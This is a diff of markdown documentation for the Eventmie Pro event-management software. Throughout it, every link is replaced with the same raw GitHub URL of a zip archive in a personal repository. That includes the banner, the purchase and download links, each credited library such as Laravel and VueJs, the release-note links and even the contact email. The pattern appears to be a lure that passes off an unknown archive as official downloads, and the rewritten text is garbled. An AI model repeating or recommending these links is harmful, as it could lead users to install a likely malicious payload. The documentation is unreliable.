@@ -16,11 +16,11 @@ We've organized the docs in perfect sequential order, so that, if you read from 
 
 ---
 
-![eventmie-pro-docs-banner-zoom-googlemeet-jiomeet](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip "eventmie-pro-docs-banner-zoom-googlemeet-jiomeet")
+![eventmie-pro-docs-banner-zoom-googlemeet-jiomeet](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip "eventmie-pro-docs-banner-zoom-googlemeet-jiomeet")
 
 ---
 
-> {https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip} **New** <small class="v">v1.4</small> **(added more videos)** Here's a complete video tutorial guide for getting started quickly **[Eventmie Pro Academy](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip)** 👈
+> {https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip} **New** <small class="v">v1.4</small> **(added more videos)** Here's a complete video tutorial guide for getting started quickly **[Eventmie Pro Academy](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip)** 👈
 
 ---
 
@@ -66,8 +66,8 @@ If you're a single organization, you can **TURN OFF** multi-organization mode in
 
 **Eventmie Pro Version** comes with **Commercial** license. Pro version is fully loaded with a lot of useful and business growing features.
 
-+ [Live (https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip)](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Visit pro version live.
-+ [Purchase (https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip)](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) -  Purchase pro version here.
++ [Live (https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip)](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Visit pro version live.
++ [Purchase (https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip)](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) -  Purchase pro version here.
 
 
 <a name="lite-version"></a>
@@ -75,9 +75,9 @@ If you're a single organization, you can **TURN OFF** multi-organization mode in
 
 **Eventmie Lite Version** is for demo purposes only, you can check out the free demo before purchasing the Pro version. Lite (demo) version has got very limited (just 5% of Pro version) features & functionality. Lite version is also not recommended for production use.
 
-+ [Live](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Visit lite version live.
-+ [Github](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Give us a Star.
-+ [Download](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Visit here to download.
++ [Live](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Visit lite version live.
++ [Github](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Give us a Star.
++ [Download](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Visit here to download.
 
 
 <a name="credits"></a>
@@ -85,37 +85,37 @@ If you're a single organization, you can **TURN OFF** multi-organization mode in
 
 To enhance the performance, security, and scalability of Eventmie Pro, we've integrated some open-source third-party libraries/packages.
 
-+ [Laravel](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - The PHP Framework for Web Artisans
-+ [Laravel Voyager](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - The Missing Laravel Admin
-+ [VueJs](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - The Progressive JavaScript Framework
-+ [VueX](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - State management pattern + library for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip applications
-+ [Laravel Ziggy](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Laravel Named Routes inside JavaScript
-+ [Twitter Bootstrap](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Responsive CSS framework
-+ [Fontawesome](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Open source icon set and toolkit.
-+ [Sass](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - CSS with superpowers
-+ [Vue-Croppa](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Online Image Cropper
-+ [Intervention Image](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - PHP Image Manipulation.
-+ [DOMPDF](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - A DOMPDF Wrapper for Laravel.
-+ [Laravel Charts](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - The laravel adapter for Chartisan.
-+ [Laravel Seeds](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Laravel Inverse Seed Generator.
-+ [Simple QrCode](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - An easy-to-use PHP QrCode generator.
-+ [Laravel CSV](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - A Laravel package to easily generate CSV files from Eloquent model.
-+ [Laravel Datatables](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Server-Side handler of DataTables.
-+ [CKEditor](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Smart WYSIWYG editor components with collaborative editing.
-+ [Axios](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Promise based HTTP client for the browser.
-+ [Moment](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Parse, validate, manipulate, & display dates & times in JavaScript.
-+ [SweetAlert2](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Beautiful JavaScript Alert.
-+ [VeeValidate](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Template Based Form Validation for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip
-+ [Vue Carousel](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - A flexible, responsive, touch-friendly carousel for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip
-+ [Vue Confirm Dialog](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Confirm Dialog verification plugin with https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip
-+ [Vue Cookie Law](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - EU Cookie Law Plugin for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip
-+ [Vue Match Heights](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Setting element heights to be the same.
-+ [Vue Select](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - select/dropdown/typeahead component.
-+ [Vue Multiselect](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - The most complete selecting solution for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip
-+ [Vue Progressbar](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - A lightweight progress bar for vue.
-+ [Vue QrCode Reader](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Read, detect and decode QR codes.
-+ [Vue Google Maps](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - Vue 2.x port of vue-google-maps.
-+ [Vue DateTime picker](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip) - A datepicker / datetimepicker component for Vue2.
++ [Laravel](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - The PHP Framework for Web Artisans
++ [Laravel Voyager](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - The Missing Laravel Admin
++ [VueJs](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - The Progressive JavaScript Framework
++ [VueX](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - State management pattern + library for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip applications
++ [Laravel Ziggy](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Laravel Named Routes inside JavaScript
++ [Twitter Bootstrap](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Responsive CSS framework
++ [Fontawesome](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Open source icon set and toolkit.
++ [Sass](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - CSS with superpowers
++ [Vue-Croppa](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Online Image Cropper
++ [Intervention Image](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - PHP Image Manipulation.
++ [DOMPDF](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - A DOMPDF Wrapper for Laravel.
++ [Laravel Charts](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - The laravel adapter for Chartisan.
++ [Laravel Seeds](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Laravel Inverse Seed Generator.
++ [Simple QrCode](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - An easy-to-use PHP QrCode generator.
++ [Laravel CSV](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - A Laravel package to easily generate CSV files from Eloquent model.
++ [Laravel Datatables](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Server-Side handler of DataTables.
++ [CKEditor](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Smart WYSIWYG editor components with collaborative editing.
++ [Axios](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Promise based HTTP client for the browser.
++ [Moment](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Parse, validate, manipulate, & display dates & times in JavaScript.
++ [SweetAlert2](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Beautiful JavaScript Alert.
++ [VeeValidate](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Template Based Form Validation for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip
++ [Vue Carousel](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - A flexible, responsive, touch-friendly carousel for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip
++ [Vue Confirm Dialog](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Confirm Dialog verification plugin with https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip
++ [Vue Cookie Law](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - EU Cookie Law Plugin for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip
++ [Vue Match Heights](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Setting element heights to be the same.
++ [Vue Select](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - select/dropdown/typeahead component.
++ [Vue Multiselect](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - The most complete selecting solution for https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip
++ [Vue Progressbar](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - A lightweight progress bar for vue.
++ [Vue QrCode Reader](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Read, detect and decode QR codes.
++ [Vue Google Maps](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - Vue 2.x port of vue-google-maps.
++ [Vue DateTime picker](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip) - A datepicker / datetimepicker component for Vue2.
 
 
 <a name="customisation-services"></a>
@@ -125,7 +125,7 @@ We provide full customization services and support for Eventmie Pro. Customizati
 
 <br>
 
-Simply email us on **https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip** for any type of queries. We would love to do business with you. 🙏 🤝 
+Simply email us on **https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip** for any type of queries. We would love to do business with you. 🙏 🤝 
 
 
 
@@ -147,13 +147,13 @@ v1.7.0 is a major release. It includes a lot of new & most requested features, i
 ### New Features
 
 - Booking (ticket purchase) Limit Per Customer: limit customer for purchasing a single ticket multiple times.<br>
-[https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip)
+[https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip)
 
 - Offline Payment Instructions: add offline payment instructions for customers.<br>
-[https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip)
+[https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip)
 
 - Skip Month From Repetitive Event Schedules: skip a month from a series of repetitive months schedules.<br>
-[https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie-pro-docs-v3.4.zip)
+[https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip](https://raw.githubusercontent.com/atifmalik220905/eventmie-pro-docs/master/resources/docs/1.8/admin/eventmie_docs_pro_v2.2.zip)
 
 - R.S.V.P for Free Tickets.<br>
 
